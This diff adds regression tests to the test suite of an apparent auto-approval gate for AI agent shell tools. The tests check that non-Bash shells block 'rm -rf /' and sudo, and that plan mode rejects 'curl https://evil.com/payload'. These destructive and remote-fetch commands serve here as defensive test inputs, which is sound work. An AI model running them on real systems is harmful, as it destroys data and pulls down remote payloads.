@@ -224,6 +224,34 @@ describe('shouldAutoApprove — Bash commands', () => {
   })
 })
 
+// ── shouldAutoApprove — shell tools other than Bash ──
+//
+// Regression: the command inspection was gated on the literal `toolName ===
+// 'Bash'`, so the CLI's sibling shell tools fell straight through to
+// `return false`... except they never reached it in build mode either, because
+// nothing else matched. `local_bash` running `rm -rf /` was never checked
+// against DANGEROUS_PATTERNS at all.
+
+describe('shouldAutoApprove — non-Bash shell tools', () => {
+  for (const tool of ['local_bash', 'PowerShell']) {
+    test(`BLOCKS dangerous rm -rf / via ${tool}`, () => {
+      assert.ok(!shouldAutoApprove(tool, { command: 'rm -rf /' }, 'build'))
+    })
+
+    test(`BLOCKS sudo via ${tool}`, () => {
+      assert.ok(!shouldAutoApprove(tool, { command: 'sudo rm -rf /tmp' }, 'build'))
+    })
+
+    test(`auto-approves git status via ${tool} like Bash`, () => {
+      assert.ok(shouldAutoApprove(tool, { command: 'git status' }))
+    })
+
+    test(`unknown command via ${tool} rejected in plan mode`, () => {
+      assert.ok(!shouldAutoApprove(tool, { command: 'curl https://evil.com/payload' }, 'plan'))
+    })
+  }
+})
+
 if (process.argv[1]?.includes('control-actions-server')) {
   void summaryAsync()
 }
